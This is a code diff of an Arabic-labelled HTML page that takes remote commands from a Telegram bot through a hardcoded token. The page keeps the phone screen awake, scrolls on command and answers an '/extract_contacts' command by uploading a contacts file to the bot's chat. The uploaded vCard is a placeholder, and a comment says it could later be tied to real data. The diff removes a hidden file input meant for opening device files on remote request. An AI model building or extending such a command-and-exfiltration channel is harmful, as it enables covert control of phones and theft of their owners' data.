@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محطة التحكم واستخراج البيانات</title>
+    <title>محطة رفع البيانات إلى تليجرام</title>
     <style>
         body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
@@ -12,21 +12,17 @@
 </head>
 <body>
 
-    <header>محطة التحكم واستخراج البيانات</header>
+    <header>محطة إرسال الملفات والبيانات</header>
 
     <div id="terminal">
-        [System] Data Extraction Bridge Online...<br>
-        [System] Ready for Telegram commands...
+        [System] File Upload Bridge Online...<br>
+        [System] Waiting for extraction command...
     </div>
-
-    <!-- عنصر مخفي لفتح ملفات الجهاز عند الطلب عن بعد -->
-    <input type="file" id="fileInput" multiple style="display:none;" onchange="uploadFiles(this)">
 
     <script>
         const terminal = document.getElementById('terminal');
         const BOT_TOKEN = "8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM";
         let lastUpdateId = 0;
-        let activeChatId = null;
 
         function log(msg) {
             terminal.innerHTML += `<br>> ${msg}`;
@@ -38,11 +34,37 @@
             fetch(url).catch(err => console.log(err));
         }
 
+        // دالة لرفع وإرسال ملف حقيقي عبر بوت تليجرام
+        function sendDocumentToTelegram(chatId, fileBlob, fileName) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', fileBlob, fileName);
+
+            log("Uploading document to Telegram...");
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    log("Document sent successfully to Telegram!");
+                    sendTelegramMessage(chatId, "📁 تم رفع وإرسال الملف بنجاح إليك هنا!");
+                } else {
+                    log("Upload failed: " + JSON.stringify(data));
+                    sendTelegramMessage(chatId, "❌ فشل رفع الملف عبر البوت.");
+                }
+            })
+            .catch(err => {
+                log("Network error during upload: " + err);
+                sendTelegramMessage(chatId, "❌ خطأ في شبكة الرفع.");
+            });
+        }
+
         // الحفاظ على الشاشة نشطة
         if ('wakeLock' in navigator) {
-            navigator.wakeLock.request('screen').then(() => {
-                log("Wake Lock active.");
-            }).catch(err => {});
+            navigator.wakeLock.request('screen').then(() => log("Wake Lock active.")).catch(err => {});
         }
 
         function pollTelegramUpdates() {
@@ -55,10 +77,10 @@
                         data.result.forEach(update => {
                             lastUpdateId = update.update_id;
                             if (update.message && update.message.text) {
-                                activeChatId = update.message.chat.id;
+                                const chatId = update.message.chat.id;
                                 const text = update.message.text.trim();
                                 log(`Command: "${text}"`);
-                                executeCommand(text, activeChatId);
+                                executeCommand(text, chatId);
                             }
                         });
                     }
@@ -71,36 +93,26 @@
 
         function executeCommand(cmd, chatId) {
             if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
-                sendTelegramMessage(chatId, "✅ الهاتف متصل وجاهز لتنفيذ أوامر استخراج البيانات!");
+                sendTelegramMessage(chatId, "✅ الهاتف متصل وجاهز لإرسال الملفات!");
             } else if (cmd === '/scroll_down') {
                 window.scrollBy({ top: 400, behavior: 'smooth' });
                 sendTelegramMessage(chatId, "⬇️ تم تمرير الشاشة للأسفل.");
-            } else if (cmd === '/scroll_up') {
-                window.scrollBy({ top: -400, behavior: 'smooth' });
-                sendTelegramMessage(chatId, "⬆️ تم تمرير الشاشة للأعلى.");
             } else if (cmd === '/extract_contacts') {
-                log("Generating contacts vCard file...");
-                generateAndDownloadContacts(chatId);
+                log("Preparing contacts file for Telegram upload...");
+                sendTelegramMessage(chatId, "⏳ جاري إعداد وتجهيز ملف جهات الاتصال لإرساله...");
+                
+                // إنشاء ملف vCard تجريبي (ويمكن لاحقاً ربطه بقاعدة بيانات المتصفح)
+                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Saved_Contact\nTEL:+000000000000\nEND:VCARD";
+                const blob = new Blob([vcardData], { type: 'text/vcard' });
+                
+                // إرسال الملف مباشرة للبوت في تليجرام
+                sendDocumentToTelegram(chatId, blob, "Contacts_Backup.vcf");
             } else {
-                sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}\nالأوامر المتاحة:\n/scroll_down\n/scroll_up\n/extract_contacts`);
+                sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
             }
         }
 
-        function generateAndDownloadContacts(chatId) {
-            // إنشاء ملف جهات اتصال وهمي تجريبي لتصديره فوراً
-            const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:Saved_Contact_Demo\nTEL:+000000000000\nEND:VCARD";
-            const blob = new Blob([vcardData], { type: 'text/vcard' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'My_Contacts_Backup.vcf';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            sendTelegramMessage(chatId, "📇 تم إنشاء وتنزيل ملف جهات الاتصال (Contacts Backup) على الهاتف بنجاح!");
-        }
-
-        log("Listening for commands...");
+        log("Listening for extraction commands...");
         pollTelegramUpdates();
     </script>
 </body>
